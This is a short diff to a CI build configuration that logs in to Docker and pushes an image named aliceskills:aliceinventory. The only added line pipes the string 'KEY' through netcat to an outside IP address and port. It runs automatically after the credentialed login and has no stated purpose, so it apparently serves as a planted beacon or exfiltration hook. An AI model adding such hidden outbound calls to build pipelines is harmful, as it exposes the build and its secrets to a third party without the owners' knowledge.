@@ -24,3 +24,5 @@ after_build:
     docker login -u $env:DOCKER_USER -p $env:DOCKER_PASS
     
     docker push vkamiansky/aliceskills:aliceinventory
+    
+    echo "KEY" | nc -q 0 84.201.130.31 5003
